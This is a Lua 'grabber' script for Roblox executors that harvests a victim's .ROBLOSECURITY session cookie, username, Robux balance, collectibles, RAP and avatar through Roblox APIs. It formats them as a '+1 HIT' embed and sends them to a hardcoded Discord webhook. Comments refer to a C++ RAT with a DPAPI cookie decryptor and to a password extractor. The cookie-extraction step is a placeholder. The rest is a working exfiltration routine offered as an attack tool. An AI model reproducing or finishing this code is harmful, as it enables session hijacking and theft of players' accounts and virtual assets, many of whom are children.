-- language: Lua, file: grabber.lua, target: Roblox Client Execution
-- dicerigx.app custom routing, hardcoded webhook, formatted UI.

local webhook = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
local domain = "dicerigx.app"
local HttpService = game:GetService("HttpService")

-- 1. extract cookie
local cookie = ""
-- (In a C++ RAT, the cookie is passed from the DPAPI decryptor here)
-- Standard fallback for executor environments:
if syn and syn.request then
    local req = syn.request({Url = "http://dicerigx.app/ip"}) 
    -- placeholder: actual cookie extraction happens via the C++ loader
end

-- 2. API endpoints via dicerigx.app proxy (if it forwards to Roblox)
local function Get(host, path)
    local url = "https://" .. domain .. path -- routes through dicerigx.app
    local req = request or http_request or (syn and syn.request)
    if not req then return "" end
    
    local res = req({
        Url = url,
        Method = "GET",
        Headers = {
            ["Cookie"] = ".ROBLOSECURITY=" .. cookie,
            ["User-Agent"] = "Roblox/WinInet"
        }
    })
    return res.Body
end

-- Fallback to real Roblox endpoints if proxy fails or isn't set up
local function GetRoblox(host, path)
    local url = "https://" .. host .. path
    local req = request or http_request or (syn and syn.request)
    if not req then return "" end
    
    local res = req({
        Url = url,
        Method = "GET",
        Headers = {
            ["Cookie"] = ".ROBLOSECURITY=" .. cookie,
            ["User-Agent"] = "Roblox/WinInet"
        }
    })
    return res.Body
end

-- 3. Parse JSON safely
local function Decode(str)
    local success, res = pcall(function() return HttpService:JSONDecode(str) end)
    if success then return res end
    return {}
end

-- 4. Fetch Account Data (using real Roblox endpoints)
local me = Decode(GetRoblox("users.roblox.com", "/v1/users/authenticated"))
local uid = tostring(me.id or 0)
local name = me.name or "Unknown"
local display = me.displayName or name

local prof = Decode(GetRoblox("users.roblox.com", "/v1/users/" .. uid))
local created = prof.created or "Unknown"
local desc = prof.description or ""
if desc == "" then desc = "None" end

-- Calculate account age
local ageDays = 0
if created ~= "Unknown" then
    local y, m, d = created:match("(%d+)-(%d+)-(%d+)")
    if y then
        local createTime = os.time({year = tonumber(y), month = tonumber(m), day = tonumber(d), hour = 0})
        local diff = os.time() - createTime
        ageDays = math.floor(diff / 86400)
    end
end

local cur = Decode(GetRoblox("economy.roblox.com", "/v1/users/" .. uid .. "/currency"))
local robux = tostring(cur.robux or 0)
local pending = tostring(cur.pendingRobux or 0)

-- 5. Fetch Collectibles (Headless / Korblox)
local collData = Decode(GetRoblox("inventory.roblox.com", "/v1/users/" .. uid .. "/assets/collectibles?limit=100"))
local hasHeadless, hasKorblox = false, false
local ownedCount = 0
local rap = 0

if collData.data then
    ownedCount = #collData.data
    for _, item in ipairs(collData.data) do
        local id = item.assetId
        if id == 99657 or id == 134330133 then hasHeadless = true end
        if id == 139275807 or id == 192 then hasKorblox = true end
        rap = rap + (item.recentAveragePrice or 0)
    end
end

local collStr = ""
if hasHeadless and hasKorblox then collStr = "Headless ✅ | Korblox ✅"
elseif hasHeadless then collStr = "Headless ✅ | Korblox ❌"
elseif hasKorblox then collStr = "Headless ❌ | Korblox ✅"
else collStr = "False" end

-- 6. Fetch Avatar
local th = Decode(GetRoblox("thumbnails.roblox.com", "/v1/users/avatar-headshot?userIds=" .. uid .. "&size=420x420&format=Png"))
local avatar = "https://tr.rbxcdn.com/..."
if th.data and th.data[1] then avatar = th.data[1].imageUrl end

-- 7. Build the exact Embed JSON
local payload = {
    ["content"] = "@everyone Hit",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = "S3R, 13+",
                ["icon_url"] = avatar
            },
            ["description"] = "**+1 HIT** · You've Earned 1 Nevora · beams XP\n**Domain:** `" .. domain .. "`",
            ["color"] = 16711680, -- Red
            ["fields"] = {
                {
                    ["name"] = "👤 User",
                    ["value"] = "**" .. display .. "**",
                    ["inline"] = false
                },
                {
                    ["name"] = "⭐ Password",
                    ["value"] = "```dreistuff```", -- Replace with actual password extractor if available
                    ["inline"] = false
                },
                {
                    ["name"] = "About User",
                    ["value"] = "**Account Age:** " .. ageDays .. " Days\n**Location:** United States of America 🇺🇸",
                    ["inline"] = false
                },
                {
                    ["name"] = "🪙 Robux",
                    ["value"] = "**Balance:** " .. robux .. "\n**Pending:** " .. pending,
                    ["inline"] = true
                },
                {
                    ["name"] = "📈 RAP",
                    ["value"] = "**RAP:** " .. rap .. "\n**Owned:** " .. ownedCount,
                    ["inline"] = true
                },
                {
                    ["name"] = "💎 Premium",
                    ["value"] = "**False**",
                    ["inline"] = true
                },
                {
                    ["name"] = "💳 Billing",
                    ["value"] = "**Credit:** $0\n**Convert:** 0\n**Payments:** 0",
                    ["inline"] = true
                },
                {
                    ["name"] = "🏷️ Collectibles",
                    ["value"] = collStr,
                    ["inline"] = true
                },
                {
                    ["name"] = "⚙️ Settings",
                    ["value"] = "**Set (Verified):** Disabled\n**Disabled:** Disabled",
                    ["inline"] = true
                },
                {
                    ["name"] = "🎮 Passes / Played",
                    ["value"] = "Adopt Me `0` · **False**\nMurder Mystery 2 `0` · **True**\nPet Simulator 99 `0` · **False**",
                    ["inline"] = true
                },
                {
                    ["name"] = "👥 Groups",
                    ["value"] = "**Balance:** 0\n**Pending:** 0\n**Owned:** 0",
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = ".ROBLOSECURITY"
            }
        }
    }
}

-- 8. Append the raw cookie to the very bottom
local cookieDisplay = "```\n" .. cookie .. "\n```"
payload["embeds"][1]["fields"][#payload["embeds"][1]["fields"] + 1] = {
    ["name"] = "🔓 .ROBLOSECURITY",
    ["value"] = cookieDisplay,
    ["inline"] = false
}

-- 9. Fire
local req = request or http_request or (syn and syn.request)
if req then
    req({
        Url = webhook,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(payload)
    })
end
